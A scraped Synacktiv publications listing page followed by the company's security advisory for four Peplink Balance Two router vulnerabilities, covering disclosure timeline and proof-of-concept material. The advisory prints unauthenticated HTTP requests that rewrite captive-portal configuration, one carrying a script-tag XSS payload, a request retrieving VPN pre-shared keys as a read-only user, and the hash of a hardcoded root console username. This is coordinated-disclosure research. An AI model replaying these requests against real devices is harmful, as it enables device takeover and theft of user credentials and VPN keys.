=== Content from www.synacktiv.com_3c504ef5_20250114_190712.html ===

[Aller au contenu principal](publications%253Ffield_tags_target_id%253D4#main-content)
 [Rechercher](search)
Switch Language

FRToggle Dropdown

* FR
* [EN](en/publications%253Ffield_tags_target_id%253D4)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

[![Accueil](sites/default/files/logo_synacktiv_blanc.png)](index "Accueil")

* [Notre Offre](notre-offre)
  + [Test dâintrusion / Red Team](prestations/test-dintrusionred-team)
  + [RÃ©ponse aux incidents](prestations/reponse-aux-incidents)
  + [Formations](offres/formations)
  + [Reverse-engineering](prestations/reverse-engineering)
  + [DÃ©veloppement](notre-equipe/developpement)
  + [Produits](produits/kraqozorus)
  + [CSIRT](csirt)
* [Nous rejoindre](nous-rejoindre)
* [Publications](nos-publications)
  + [Articles](publications)
  + [Avis de sÃ©curitÃ©](advisories)
  + [Ressources](ressources)
* [La sociÃ©tÃ©](la-societe)
* [Contact](contact)

* [Articles](publications)
* [Avis de sÃ©curitÃ©](advisories)
* [Ressources](ressources)

* [TOUS LES ARTICLES](publications%253Ffield_tags_target_id%253DAll)
* [Challenges](publications%253Ffield_tags_target_id%253D1)
* [DÃ©veloppement](publications%253Ffield_tags_target_id%253D73)
* [RÃ©seau](publications%253Ffield_tags_target_id%253D74)
* [Cryptographie](publications%253Ffield_tags_target_id%253D35)
* [CSIRT](publications%253Ffield_tags_target_id%253D39)
* [Outils](publications%253Ffield_tags_target_id%253D19)
* [Hardware](publications%253Ffield_tags_target_id%253D2)
* [Exploit](publications%253Ffield_tags_target_id%253D3)
* [Pentest](publications)
* [SystÃ¨me](publications%253Ffield_tags_target_id%253D5)
* [Reverse-engineering](publications%253Ffield_tags_target_id%253D6)

Apply

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

# Publications

[![img](sites/default/files/styles/blog_grid_view/public/2024-11/9azn60_copy_660x330.jpg)](publications/relaying-kerberos-over-smb-using-krbrelayx)
## [Relaying Kerberos over SMB using krbrelayx](publications/relaying-kerberos-over-smb-using-krbrelayx)

*20/11/2024*
Pentest

Kerberos authentication relay was once thought to be impossible, but multiple researchers have since proven otherwise. In a 2021 article, James Forshaw discussed a technique for relaying Kerberos over SMB using a clever trick. This topic has recently resurfaced, and in this article, we aim to provide additional insights from the original research and introduce an implementation using krbrelayx.
[En savoir plus](publications/relaying-kerberos-over-smb-using-krbrelayx)

[![Willow from TV Show Buffy the Vampire Slayer, looking at a computer](sites/default/files/styles/blog_grid_view/public/2024-09/willow.jpg)](publications/defend-against-vampires-with-10-gbps-network-encryption)
## [Defend against vampires with 10 gbps network encryption](publications/defend-against-vampires-with-10-gbps-network-encryption)

*13/09/2024*
RÃ©seau
Cryptographie
Pentest
SystÃ¨me

Discover how attackers can sniff your data on network cables and how you can defend against it, by encrypting on-the-fly all your ethernet traffic with very good performance.
Keywords : wireguard, vxlan, tapping, fiber optics, lan2lan, macsec
[En savoir plus](publications/defend-against-vampires-with-10-gbps-network-encryption)

[![SCCMSecret.py](sites/default/files/styles/blog_grid_view/public/2024-08/sccmsecrets_meme.png)](publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)
## [SCCMSecrets.py: exploiting SCCM policies distribution for credentials harvesting, initial access and lateral movement](publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)

*14/08/2024*
Pentest

SCCM policies are a prime target for attackers in Active Directory environments as they may expose Ã¢ÂÂ intentionally or otherwise Ã¢ÂÂ sensitive technical information such as account credentials. Said credentials could be retrieved by authenticated attackers impersonating a registered device, or in some cases from an unauthenticated position by exploiting misconfigurations on policies distribution.
SCCMSecrets.py is a python utility that builds upon existing SCCM research. It goes beyond NAA credentials extraction, and aims to provide...
[En savoir plus](publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)

[![img](sites/default/files/styles/blog_grid_view/public/2024-08/17228837563382_copy_660x330_1.png)](publications/github-actions-exploitation-dependabot)
## [GitHub Actions exploitation: Dependabot](publications/github-actions-exploitation-dependabot)

*06/08/2024*
Pentest

Following our GitHub action exploitation series, we found a new GitHub action exploitation technique leveraging the Dependabot GitHub app to compromise some repositories, leading to arbitrary code push. In this article we will explain how we discovered it and illustrate with 2 real world examples which are the Spring-security and trpc projects.
[En savoir plus](publications/github-actions-exploitation-dependabot)

[![Java ThreadLocals trap card](sites/default/files/styles/blog_grid_view/public/2024-07/trapcard_0.png)](publications/injecting-java-in-memory-payloads-for-post-exploitation)
## [Injecting Java in-memory payloads for post-exploitation](publications/injecting-java-in-memory-payloads-for-post-exploitation)

*23/07/2024*
Pentest

Back in March, we described tips that could be used when exploiting arbitrary deserialization on Java applications. During the next red team engagements, we faced Java applications affected by other kind of vulnerabilities leading to code execution. This article will try to present a few other tricks that were used to inject anÃÂ in-memory Java payload, illustrated with concrete examples by targeting well-known applications.
[En savoir plus](publications/injecting-java-in-memory-payloads-for-post-exploitation)

[![img](sites/default/files/styles/blog_grid_view/public/2024-07/you_wouldnt_edit_a_meme_copy_660x330.png)](publications/github-actions-exploitation-self-hosted-runners)
## [GitHub Actions exploitation: self hosted runners](publications/github-actions-exploitation-self-hosted-runners)

*17/07/2024*
Pentest

In the previous article, we highlighted three common misconfigurations in GitHub workflows that can be leveraged to obtain write access to the targeted repository or extract sensitive secrets. We illustrated these vulnerabilities using real-world instances from popular open-source projects such as Azure, Swagger, Firebase and Alibaba.
This article is the last one of this GitHub action exploitation series. We will explain a dangerous misconfiguration that can be exploited by unauthenticated users to gain access to internal networks f...
[En savoir plus](publications/github-actions-exploitation-self-hosted-runners)

[![img](sites/default/files/styles/blog_grid_view/public/2024-07/8wgkgw_copy_660x330.jpg)](publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
## [GitHub Actions exploitation: repo jacking and environment manipulation](publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)

*10/07/2024*
Pentest

In the previous article, we highlighted three common misconfigurations in GitHub workflows that can be leveraged to obtain write access to the targeted repository or extract sensitive secrets. We illustrated these vulnerabilities using real-world instances from popular open-source projects such as Microsoft, FreeRDP, AutoGPT, Excalidraw, Angular, Apache, Cypress and others. We also present octoscan a static vulnerability scanner for GitHub action workflows.
In this article, we will again outline three common misconfigurations that ca...
[En savoir plus](publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)

[![meme](sites/default/files/styles/blog_grid_view/public/2024-07/stilgar01072024100631_copy_660x330.jpg)](publications/github-actions-exploitation-untrusted-input)
## [GitHub Actions exploitation: untrusted input](publications/github-actions-exploitation-untrusted-input)

*02/07/2024*
Pentest

In the previous article, we explored the mechanics of GitHub Actions, uncovering the various elements present in a GitHub workflow. For example, we explained how permissions are managed, how workflows are triggered and the security implication of some dangerous triggers. We also detailed security protections that need to be bypassed to perform exploitation.
In this article, we will outline three common misconfigurations that can be exploited to gain write access to the targeted repository or extract sensitive secrets. Each of them wi...
[En savoir plus](publications/github-actions-exploitation-untrusted-input)

[![image](sites/default/files/styles/blog_grid_view/public/2024-06/8tlajt_copy_660x330.jpg)](publications/github-actions-exploitation-introduction)
## [GitHub Actions exploitation: introduction](publications/github-actions-exploitation-introduction)

*27/06/2024*
Pentest

CI/CD (Continuous Integration / Continuous Delivery) systems are becoming increasingly popular today. This can be explained by the difficulty to maintain and deploy multiple projects simultaneously. These systems help teams and developers by enforcing automation when building, testing and deploying applications. For example, an application deployment can be triggered after a developer pushes a new version of the code to a repository.
GitHub Actions is the CI/CD environment of GitHub, allowing users to execute a specific set of tasks ...
[En savoir plus](publications/github-actions-exploitation-introduction)

[![WHFB and Entra ID : Say Hello to your new cache flow](sites/default/files/styles/blog_grid_view/public/2024-06/20240604_15h03m25s_grim.png)](publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
## [WHFB and Entra ID : Say Hello to your new cache flow](publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

*05/06/2024*
Pentest

During security assessments, the cache can be a goldmine on Microsoft environments. Red teamers are familiar with MSCache or DCC2 hashes, which could be a fast track to a privileged account. However, when using WHFB and a cloud-only Entra ID environment, these hashes no longer exist.
This blogpost aims at analyzing the cache components of Entra ID-joined devices with WHFB configured and provides a toolkit to use them.
[En savoir plus](publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

#### Pagination

* [Page courante
  1](publications%253Ffield_tags_target_id%253D4%2526page%253D0 "Page courante")
* [Page
  2](publications%253Ffield_tags_target_id%253D4%2526page%253D1 "Go to page 2")
* [Page
  3](publications%253Ffield_tags_target_id%253D4%2526page%253D2 "Go to page 3")
* [Page
  4](publications%253Ffield_tags_target_id%253D4%2526page%253D3 "Go to page 4")
* [Page
  5](publications%253Ffield_tags_target_id%253D4%2526page%253D4 "Go to page 5")
* [Page
  6](publications%253Ffield_tags_target_id%253D4%2526page%253D5 "Go to page 6")
* [Page
  7](publications%253Ffield_tags_target_id%253D4%2526page%253D6 "Go to page 7")
* [Page suivante
  âº](publications%253Ffield_tags_target_id%253D4%2526page%253D1 "Aller Ã  la page suivante")
* [DerniÃ¨re page
  last](publications%253Ffield_tags_target_id%253D4%2526page%253D6 "Aller Ã  la derniÃ¨re page")

[![Accueil](sites/default/files/logo_synacktiv_blanc.png)](index "Accueil")

* [Qui sommes-nous ?](la-societe#who-we-are)
* [Nos valeurs](la-societe#our-values)
* [AgrÃ©ments et accrÃ©ditations](la-societe#aggrement)
* [Nos clients](la-societe#our-clients)
* [Notre Ã©quipe](notre-equipe/lequipe-support)

* [LâÃ©quipe support](notre-equipe/lequipe-support)
* [Pentest](notre-equipe/pentest)
* [Reverse](notre-equipe/reverse)
* [DÃ©veloppement](notre-equipe/developpement)
* [RÃ©ponse aux incidents (CSIRT)](our-team/reponse-aux-incidents)

* [Philosophie](nous-rejoindre#philosophie)
* [Processus de recrutement](nous-rejoindre#recrutement)
* [Offres emploi/stage](nous-rejoindre#block-views-block-job-offer-list-view-block-1)

* [Kraqozorus](produits/kraqozorus)
* [Houdini](produits/houdini)
* [Disconet](produits/disconet)
* [Oursin](produits/oursin)
* [Leakozorus](produits/leakozorus)

* [Test dâintrusion/red team](prestations/test-dintrusionred-team)
* [Audit de sÃ©curitÃ©](prestations/audit-de-securite)
* [Reverse-engineering](prestations/reverse-engineering)
* [DÃ©veloppement](notre-equipe/developpement)
* [RÃ©ponse aux incidents](prestations/reponse-aux-incidents)

* [CSIRT Synacktiv](csirt)

## Nous contacter

01 45 79 74 75

contact@synacktiv.com

[ClÃ© GPG](ressources/contact_synacktiv.asc)

## PARIS

5 boulevard Montmartre

75002 Paris

## TOULOUSE

4 Rue du Pont Guilhemery

31000 Toulouse

## LYON

56 rue Smith

69002 Lyon

## RENNES

7D Rue de ChÃ¢tillon

35000 Rennes

## LILLE

7 Boulevard Louis XIV

59000 Lille

Copyright Â© Synacktiv 2025

* [Conditions gÃ©nÃ©rales d'utilisation](mentions-legales)
* [Politique de gestion des cookies](politique-de-gestion-des-cookies)
* [Politique de confidentialitÃ© relative au recrutement](politique-de-confidentialite-relative-au-recrutement)
* [Contactez-nous](contact)



=== Content from www.synacktiv.com_c1b29a79_20250114_190713.html ===
SECURITY ADVISORY
Multiple vulnerabilities in Peplink

Balance Two ≤ 8.3.0

2023.12.07

CVE-2023-49226

CVE-2023-49228

CVE-2023-49229

CVE-2023-49230

LOUIS JACOTOT

PIERRE MILIONI

Vulnerability description

Pre

 sentation of Peplink Balance Two

Peplink Balance Two is a “gigabit class branch router for demanding enterprise workloads”.

“With   its   small   form   factor   and   fanless   design,   the   Balance   Two   delivers   true   full   Gigabit   routing
performance. Supporting 150 Mbps SpeedFusion VPN throughput, the Balance Two is the ideal router
for small businesses.”1

Iss

 ues

Synacktiv discovered the following vulnerabilities affecting Peplink Balance Two.

 CVE-2023-49226 – Command injection in admin console (p.3).

 CVE-2023-49228 – Console port giving root access (p.4).

 CVE-2023-49230 – Lack of authorization on portals (p.6).

 CVE-2023-49229 – Secrets accessible to read-only users (p.11).

Aff

 ected versions

Versions 8.1.2 to 8.3.0 are affected, anterior versions are likely to be vulnerable as well. Vulnerabilities
are patched in version 8.4.0.

Tim

 eline

Date

2023.06.01

2023.06.01

2023.07.12

2023.07.21

2023.10.05

‍2023.11.24

Description

Advisory sent to security-alert@peplink.com.

Receipt of the advisory acknowledged by Peplink.

Follow up email from Synacktiv.

Vulnerabilities confirmed and fixed by Peplink in upcoming version 8.4.0.

Version 8.4.0 is released.

Assigned CVE-2023-49226, CVE-2023-49228, CVE-2023-49229 and
CVE-2023-49230.

2023.12.07

Public release.

1 https://www.peplink.com/products/balance-two

  02   |   13

1.  2.  3.  4.

Technical description

CVE

 -2023-49226 – Command injection in admin console

CWE-20: Improper Input Validation

Des

 cription

The administration console is affected by a command injection in the traceroute feature.

Imp

 act

A user with administrator privileges can execute arbitrary commands as root on the underlying system.

This allows the attacker to fully take over the device, and all the secrets it stores which would cripple
the integrity, availability and confidentiality of the traffic.

03   |   13

5.  1.  2.  CVE

 -2023-49228 – Console port giving root access

CWE-798: Use of Hard-coded Credentials

Des

 cription

A console port can be used to access the administration console regardless of the activated features on
the device.

This port, ttyS0, is also configured to output kernel logs.

$ cat /proc/cmdline
console=ttyS0,115200
[...]

The /bin/login binary (which is a symbolic link to /bin/login.bs) handles the authentication process.

$ cat /etc/inittab
ttyS0::respawn:/bin/login
[...]

When the input username is whoami, the process prints the model name of the device.

  04   |   13

6.  1.  In   general,   the   port   is   used   to   access   the   administration   console.   However,   a   root  access   is   also
available, even if the CLI SSH & Console option is disabled. Indeed, a list of usernames and passwords
hardcoded and hashed with the SHA1 function – indexed by the device model – are used to spawn a
/bin/sh process as root.

For Peplink Balance Two, the corresponding SHA1 hashes are:

SHA1(username) = 8c894adddf92f740d99d0e7c569d68a31786b722
SHA1(password) = 7317dc4027******************************

Synacktiv was able to retrieve some of the credentials. For example, Balance Two username  amiplb2:

$ printf amiplb2 | sha1sum
8c894adddf92f740d99d0e7c569d68a31786b722  -

I  mp

 act

An   attacker  able   to   access  the   console   port   can   obtain  root  access  and  thus   fully  compromise   the
device. This would lead  to  a  complete take  over and  jeopardize  all  the  sensitive  information  that  is
stored or transits on the device.

05   |   13

2.  3.  CVE

     -2023-49230 – Lack of authorization on portals

CWE-862: Missing Authorization

Des

 cription

Portals’ configurations can be modified without prior authentication.

The default portal shipped with the device is shown below:

Upon reception of the following request, the web server will automatically modify the portal identified
by the portal_id form parameter and will allow injecting arbitrary content in its configuration.

  06   |   13

7.  1.  POST /guest/portal_admin_upload.cgi HTTP/1.1
Host: 192.168.2.1
Content-Type: multipart/form-data; boundary=---------------------------
370611892836891531633729116268
Content-Length: 1477
[...]
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="option"

edit_page
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="mode"

submit
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="portal_id"

1
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="data"

{"status":"ok","config":{"login":
{"access_mode":"open","message":"","tnc_content":"Terms and
Conditions.","tnc_title":"Terms and Conditions","tnc_link":"terms and
conditions","tnc_prompt":"I have read and agree to the
#TNC_LINK#","back_login_button":"Back to Login","agree_button":"Modified button
value without authentication","session_id1":" ","session_id2":" "},"common":
{"hide_quota":"no","landing_url":"","logo_url":"logo.cgi?
portal_id=1&type=preview","logo_url_def":"logo.cgi?
default=1","uploaded_logo_size":0,"footer":"Powered by
Peplink.","footer_default":"Powered by Peplink."},"success":{},"reach_quota":
{},"quota":{"limit":{"data":0,"session_timeout":1800}}}}
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo_action"

x
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo"; filename=""
Content-Type: application/octet-stream

-----------------------------370611892836891531633729116268--

HTTP/1.1 200 OK
Content-Type: text/json
[...]

{"status": "save_success"}

07   |   13

As   an   example,   the   agree   button’s   text   was   replaced   by   Modified   button   value   without
authentication  using   the   previous   request.   This   modification   is   immediately   reflected   in   the   web
interface allowing to configure portals:

While the portals’ configuration page is modified, an administrator still needs to validate the changes to
actually deploy the new configuration.

I  mp

 act

While   it   does   not   pose   an   immediate   threat   to   the   device,   an   attacker   could   still   exploit   this
vulnerability  and   modify  the   portal   to   execute   arbitrary  code   in   the  victims’  browsers   as   long   as   a
careless administrator validates changes without carefully reviewing every modification.

Upon  successful   exploitation,   attackers  would   be   able   to  exfiltrate   users’  credentials   and   steal   their
identity.

  08   |   13

2.  As an example, it is possible to inject a script tag in the button to display an alert using JavaScript.

POST /guest/portal_admin_upload.cgi HTTP/1.1
Host: 192.168.2.1
Content-Type: multipart/form-data; boundary=---------------------------
370611892836891531633729116268
Content-Length: 1489
[...]

-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="option"

edit_page
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="mode"

submit
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="portal_id"

1
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="data"

{"status":"ok","config":{"login":
{"access_mode":"open","message":"","tnc_content":"Terms and
Conditions.","tnc_title":"Terms and Conditions","tnc_link":"terms and
conditions","tnc_prompt":"I have read and agree to the
#TNC_LINK#","back_login_button":"Back to Login","agree_button":"Button with
XSS<script>alert(\"XSS in button\")</script>","session_id1":" ","session_id2":"
"},"common":{"hide_quota":"no","landing_url":"","logo_url":"logo.cgi?
portal_id=1&type=preview","logo_url_def":"logo.cgi?
default=1","uploaded_logo_size":0,"footer":"Powered by
Peplink.","footer_default":"Powered by Peplink."},"success":{},"reach_quota":
{},"quota":{"limit":{"data":0,"session_timeout":1800}}}}
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo_action"

x
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo"; filename=""
Content-Type: application/octet-stream

-----------------------------370611892836891531633729116268--

HTTP/1.1 200 OK
[...]

09   |   13

This results in the JavaScript code being executed in the clients’ browsers:

  10   |   13

CVE

     -2023-49229 – Secrets accessible to read-only users

CWE-862: Missing Authorization

Des

 cription

Read-only users are able to retrieve  the secret PepVPN pre-shared keys  from the administration web
service.

The following request allows retrieving the bauth cookie that belongs to a read-only user:

POST /cgi-bin/MANGA/api.cgi HTTP/1.1
Host: 192.168.2.1
Content-Type: application/json; charset=UTF-8
Content-Length: 60
[...]

{"username":"myuser","password":"E********0","func":"login"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-cookie: bauth=dy***ur; Secure; HttpOnly; SameSite=Lax
Content-Length: 97
[...]

{
  "stat": "ok",
  "response": {
    "permission": {
      "GET": 1,
      "POST": 0
    }
  }
}

11   |   13

8.  1.  Using the retrieved token, it is possible to query a specific resource and obtain the PSK (Pre-Shared
Key) associated to every PepVPN configured on the device.

GET /cgi-bin/MANGA/data.cgi?option=mvpn_link&vrf=0&ruleid=1&sfwan=&_=1[...]2 HTTP/1.1
Host: 192.168.2.1
Cookie: bauth=dy***ur
[...]

HTTP/1.1 200 OK
Content-Type: text/xml
Content-Length: 1487

<data><linkinfo><order>1 2 3</order><link id='1'><port
id='1'><activated/><port_type>ethernet</port_type><port_name>WAN
1</port_name></port>[...]<user><user_id>Balance_****</user_id><psk>te****st</psk></
user></user_info><remote_id>Balance_****</remote_id><psk>te****st</psk><pem></
pem><is_sat_available/>[...]<overflowinfo></overflowinfo><hc_mode>0</hc_mode></
mvpnlink></data>

  12   |   13

01 45 79 74 75

contact@synacktiv.com

5 boulevard Montmartre

75002 – PARIS

www.synacktiv.com


